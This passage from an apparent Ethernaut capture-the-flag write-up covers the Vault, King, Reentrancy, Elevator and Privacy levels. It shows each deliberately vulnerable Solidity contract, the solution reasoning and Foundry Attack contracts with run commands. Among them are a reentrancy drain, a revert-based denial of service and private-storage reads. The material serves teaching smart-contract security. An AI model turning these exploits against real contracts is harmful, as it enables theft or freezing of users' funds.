        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Vault locked : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">vault</span><span class="p">.</span><span class="nf">locked</span><span class="p">());</span>
        <span class="nx">bytes32</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span> <span class="nf">bytes32</span><span class="p">(</span><span class="nf">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes32</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
        <span class="nx">vault</span><span class="p">.</span><span class="nf">unlock</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Vault locked : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">vault</span><span class="p">.</span><span class="nf">locked</span><span class="p">());</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/VaultSolve.s.sol:VaultSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="9-king">9 King</h1>

<p><code class="language-plaintext highlighter-rouge">King.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">King</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="nx">king</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">prize</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>  
    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">prize</span> <span class="o">||</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
    <span class="nf">payable</span><span class="p">(</span><span class="nx">king</span><span class="p">).</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">_king</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">king</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Be the <code class="language-plaintext highlighter-rouge">King</code> and make others dont claim the <code class="language-plaintext highlighter-rouge">King</code> position again.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Initially check the <code class="language-plaintext highlighter-rouge">prize</code> amount that need to send to be the king. And send the <code class="language-plaintext highlighter-rouge">prize</code> amount to the <code class="language-plaintext highlighter-rouge">King</code> contract.</li>
  <li>When someone send the <code class="language-plaintext highlighter-rouge">prize</code> amount back to us to claim the king position, we can deny the money.</li>
  <li>So, that they wont be the king anymore.</li>
  <li>In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any <code class="language-plaintext highlighter-rouge">receive()/fallback()</code> function.</li>
  <li>This will revert others transaction when they sends prize to us, So, we will remain as the king.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">KingSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">King</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/King.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">KingSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">King</span> <span class="nx">king</span> <span class="o">=</span> <span class="nc">King</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2</span><span class="p">));</span>
        <span class="nx">uint</span> <span class="nx">_prize</span> <span class="o">=</span> <span class="nx">king</span><span class="p">.</span><span class="nf">prize</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Current King : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">king</span><span class="p">.</span><span class="nf">_king</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Current Prize : </span><span class="dl">"</span><span class="p">,</span><span class="nx">_prize</span><span class="p">);</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nx">exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="nx">_prize</span><span class="p">}();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Final King : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">king</span><span class="p">.</span><span class="nf">_king</span><span class="p">());</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">King</span> <span class="kr">public</span> <span class="nx">king</span> <span class="o">=</span> <span class="nc">King</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2</span><span class="p">));</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span><span class="p">{</span>
        <span class="nf">address</span><span class="p">(</span><span class="nx">king</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span> <span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/KingSolve.s.sol:KingSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="10-reentrancy">10 Reentrancy</h1>

<p><code class="language-plaintext highlighter-rouge">Reentrancy.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">12</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">'</span><span class="s1">openzeppelin-contracts-06/math/SafeMath.sol</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Reentrance</span> <span class="p">{</span>
  
  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nf">donate</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nf">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_who</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">_amount</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,)</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
      <span class="nf">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_amount</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_amount</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Drain all the ether of the Reentrance contract</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>The <code class="language-plaintext highlighter-rouge">withdraw()</code> function is vulnerable to <code class="language-plaintext highlighter-rouge">Reentrancy</code>, as it is updating the user balance after the external call.</li>
  <li>One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.</li>
  <li>So, we will donate some ether to the contract and then call withdraw from a contract.</li>
  <li>The withdraw call send our ether back and invokes the fallback or receive function of our contract.</li>
  <li>We can call the <code class="language-plaintext highlighter-rouge">withdraw()</code> function again from the fallback function to reenter again into <code class="language-plaintext highlighter-rouge">Reentrance</code> contract.</li>
  <li>Still we can manage to pass require check as our balance wasn’t updated yet.</li>
  <li>We need to check the balance of the <code class="language-plaintext highlighter-rouge">Reentrance</code> contract before reentering because when we call the withdraw again after the balance of <code class="language-plaintext highlighter-rouge">Reentrance</code> becomes zero will revert the entire transaction.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">ReentrancySolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">12</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Reentrance</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Reentrancy.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">ReentrancySolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Reentrance</span> <span class="kr">public</span> <span class="nx">reentrance</span> <span class="o">=</span> <span class="nc">Reentrance</span><span class="p">(</span><span class="mh">0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Initial Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">reentrance</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nx">exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">}();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Final Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">reentrance</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Reentrance</span> <span class="kr">public</span> <span class="nx">reentrance</span> <span class="o">=</span> <span class="nc">Reentrance</span><span class="p">(</span><span class="mh">0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span><span class="p">{</span>
        <span class="nx">reentrance</span><span class="p">.</span><span class="nx">donate</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">}(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
        <span class="nx">reentrance</span><span class="p">.</span><span class="nf">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>

        <span class="c1">// I need my sepolia back</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span> <span class="p">:</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nf">receive</span><span class="p">()</span> <span class="nx">payable</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nf">if </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">reentrance</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&gt;=</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">){</span>
            <span class="nx">reentrance</span><span class="p">.</span><span class="nf">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/ReentrancySolve.s.sol:ReentrancySolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="11-elevator">11 Elevator</h1>

<p><code class="language-plaintext highlighter-rouge">Elevator.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">Building</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nf">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>


<span class="nx">contract</span> <span class="nx">Elevator</span> <span class="p">{</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">top</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">floor</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nf">goTo</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_floor</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">Building</span> <span class="nx">building</span> <span class="o">=</span> <span class="nc">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

    <span class="nf">if </span><span class="p">(</span><span class="o">!</span> <span class="nx">building</span><span class="p">.</span><span class="nf">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">floor</span> <span class="o">=</span> <span class="nx">_floor</span><span class="p">;</span>
      <span class="nx">top</span> <span class="o">=</span> <span class="nx">building</span><span class="p">.</span><span class="nf">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>We need to get to the top floor, i.e make the top boolean to <code class="language-plaintext highlighter-rouge">true</code></li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>The Elevator calling the <code class="language-plaintext highlighter-rouge">isLastFloor()</code> function on <code class="language-plaintext highlighter-rouge">msg.sender</code> which is insecure. Dont trust the unknown libraries or contract while making the calls.</li>
  <li>The <code class="language-plaintext highlighter-rouge">top</code> variable is being updated upon the return value of the <code class="language-plaintext highlighter-rouge">isLastFloor()</code> function.</li>
  <li>But, To pass the <code class="language-plaintext highlighter-rouge">if</code> condition the <code class="language-plaintext highlighter-rouge">isLastFloor()</code> should return the <code class="language-plaintext highlighter-rouge">false</code>. But the <code class="language-plaintext highlighter-rouge">top</code> will become <code class="language-plaintext highlighter-rouge">false</code> only if it results false everytime.</li>
  <li>We can observe that the <code class="language-plaintext highlighter-rouge">isLastFloor()</code> function is being called twice. So, we can write a contract which implements <code class="language-plaintext highlighter-rouge">isLastFloor()</code> function is such a way that is returns <code class="language-plaintext highlighter-rouge">false</code> on first call and <code class="language-plaintext highlighter-rouge">true</code> on second call.</li>
  <li>So, that the <code class="language-plaintext highlighter-rouge">if</code> condition satifsies and <code class="language-plaintext highlighter-rouge">top</code> will be updated to true.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">ElevatorSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Elevator</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Elevator.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">ElevatorSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Elevator</span> <span class="kr">public</span> <span class="nx">elevator</span> <span class="o">=</span> <span class="nc">Elevator</span><span class="p">(</span><span class="mh">0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Top : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">elevator</span><span class="p">.</span><span class="nf">top</span><span class="p">());</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Top : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">elevator</span><span class="p">.</span><span class="nf">top</span><span class="p">());</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Elevator</span> <span class="kr">public</span> <span class="nx">elevator</span> <span class="o">=</span> <span class="nc">Elevator</span><span class="p">(</span><span class="mh">0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718</span><span class="p">);</span>
    <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">callCount</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span><span class="p">{</span>
        <span class="nx">elevator</span><span class="p">.</span><span class="nf">goTo</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">){</span>
        <span class="nx">callCount</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">callCount</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/ElevatorSolve.s.sol:ElevatorSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="12-privacy">12 Privacy</h1>

<p><code class="language-plaintext highlighter-rouge">Privacy.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Privacy</span> <span class="p">{</span>

  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">ID</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
  <span class="nx">uint8</span> <span class="kr">private</span> <span class="nx">flattening</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="nx">uint8</span> <span class="kr">private</span> <span class="nx">denomination</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
  <span class="nx">uint16</span> <span class="kr">private</span> <span class="nx">awkwardness</span> <span class="o">=</span> <span class="nf">uint16</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
  <span class="nx">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="kr">private</span> <span class="nx">data</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">_data</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">unlock</span><span class="p">(</span><span class="nx">bytes16</span> <span class="nx">_key</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">_key</span> <span class="o">==</span> <span class="nf">bytes16</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
    <span class="nx">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="cm">/*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */</span>
<span class="p">}</span>

</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>We need to unlock the contract, i.e call <code class="language-plaintext highlighter-rouge">unlock()</code> function with right password.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>This challenge is similar to <code class="language-plaintext highlighter-rouge">Vault</code>. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.</li>
  <li>The storage layout of contract as follows :
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool public locked = true;                      // slot 0
uint256 public ID = block.timestamp;             // slot 1
uint8 private flattening = 10;                   // slot 2
uint8 private denomination = 255;                // slot 2
uint16 private awkwardness = uint16(block.timestamp);  // slot 2
bytes32[3] private data;    // data[0] =&gt; slot 3  // data[1] =&gt; slot 4  // data[2] =&gt; slot 5
</code></pre></div>    </div>
  </li>
  <li>Password is the lower 16 bytes of the <code class="language-plaintext highlighter-rouge">data[2]</code>, i.e <code class="language-plaintext highlighter-rouge">require(_key == bytes16(data[2]));</code></li>
  <li>Since the <code class="language-plaintext highlighter-rouge">data[2]</code> stored at slot 5, we can query it with <code class="language-plaintext highlighter-rouge">vm.load</code> cheatcode.</li>
  <li>Calling unlock with this password will solve the challenge.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">PrivacySolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
